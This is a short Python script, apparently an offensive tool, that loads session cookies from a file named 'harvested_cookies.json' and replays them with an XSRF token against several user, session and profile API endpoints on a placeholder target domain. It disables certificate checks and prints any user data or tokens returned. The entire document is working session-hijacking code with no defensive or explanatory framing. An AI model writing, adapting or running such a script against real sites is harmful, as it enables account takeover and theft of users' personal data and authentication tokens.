import json
import httpx
import warnings

warnings.filterwarnings("ignore")

COOKIE_FILE = "harvested_cookies.json"
BASE_URL = "https://yourtarget.com" # or target domain

def dump_tokens():
    print("[*] Initializing Authenticated User Token Dumper...")
    
    try:
        with open(COOKIE_FILE, "r", encoding="utf-8") as f:
            cookies_list = json.load(f)
    except Exception as e:
        print(f"[!] Error loading {COOKIE_FILE}: {e}")
        return
        
    cookie_jar = {c['name']: c['value'] for c in cookies_list}
    xsrf_token = cookie_jar.get("XSRF-TOKEN", "")
    
    client = httpx.Client(verify=False, timeout=10.0, follow_redirects=True, cookies=cookie_jar)
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json, text/plain, */*",
        "X-Requested-With": "XMLHttpRequest"
    }
    
    if xsrf_token:
        headers["X-XSRF-TOKEN"] = xsrf_token
        
    # High-value endpoints where user tokens and profile data reside
    endpoints = [
        "/api/v2/users/current",
        "/api/v1/auth/session",
        "/api/user",
        "/user-center/api/v1/users/profile",
        "/graphql"
    ]
    
    print(f"[+] Querying {len(endpoints)} authenticated endpoints with session cookie jar...\n")
    
    for path in endpoints:
        url = BASE_URL + path
        try:
            res = client.get(url, headers=headers)
            print(f"    -> GET {path} | Status: {res.status_code} | Length: {len(res.text)}")
            if res.status_code == 200 and len(res.text) > 2:
                print(f"        [***] SUCCESS! USER DATA / TOKEN UNLOCKED:\n{res.text[:600]}\n")
            else:
                print(f"        [-] Response Preview: {res.text[:120]}\n")
        except httpx.RequestError as e:
            print(f"    -> Connection Error: {e}")
            
    client.close()
    print("[*] Token dump cycle complete.")

if __name__ == "__main__":
    dump_tokens()
